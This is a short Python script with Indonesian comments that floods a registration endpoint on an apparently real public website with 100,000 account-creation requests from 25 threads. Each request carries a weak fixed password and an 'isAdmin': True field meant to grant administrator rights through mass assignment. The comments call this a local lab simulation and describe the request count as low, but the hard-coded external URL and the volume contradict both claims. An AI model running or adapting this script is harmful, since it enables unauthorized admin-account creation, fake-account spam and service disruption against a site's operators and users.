import requests
import json
import itertools
from concurrent.futures import ThreadPoolExecutor

# URL Endpoint Target (Pastikan diarahkan ke lingkungan server lab lokal/internal Anda)
URL_TARGET = 'https://indokey.id/backend/api/auth/register.php'

# Konfigurasi Concurrency untuk Simulasi Lab
JUMLAH_THREAD = 25          # Disesuaikan ke jumlah rendah untuk stabilitas pengujian internal
MAKSIMAL_REQUEST = 100000      # Disesuaikan ke jumlah rendah untuk validasi fungsional skrip

def kirim_request_bot(data_kombinasi):
    nomor_urut, item = data_kombinasi
    string_acak = "".join(item)
    
    username = f"Nusantara_{string_acak}"
    email = f"Nusantara_{string_acak}@gmail.com"
    
    payload = {
        'username': username,
        'email': email,
        'password': 'password123',
        'isAdmin': True
    }
    
    headers = {
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.post(URL_TARGET, data=json.dumps(payload), headers=headers, timeout=3)
        if response.status_code in [200, 201]:
            return f"[+] Akun {nomor_urut} berhasil dibuat -> {username}"
        else:
            return f"[-] Akun {nomor_urut} gagal dibuat (Server merespon: {response.status_code})"
    except requests.exceptions.RequestException:
        return f"[-] Akun {nomor_urut} gagal dibuat (Error koneksi ke server)"

def main():
    karakter = "abcdefghijklmnopqrstuvwxyz0123456789"
    kombinasi_generator = itertools.product(karakter, repeat=6)
    
    antrean_tugas = list(enumerate(itertools.islice(kombinasi_generator, MAKSIMAL_REQUEST), start=1))
    
    print(f"[+] Memulai simulasi bot dengan {JUMLAH_THREAD} thread...")
    print(f"[+] Menjalankan total {len(antrean_tugas)} antrean tugas...\n")
    
    with ThreadPoolExecutor(max_workers=JUMLAH_THREAD) as executor:
        hasil_eksekusi = executor.map(kirim_request_bot, antrean_tugas)
        for hasil in hasil_eksekusi:
            print(hasil)

    print("\n[+] Pengujian selesai.")

if __name__ == "__main__":
    main()
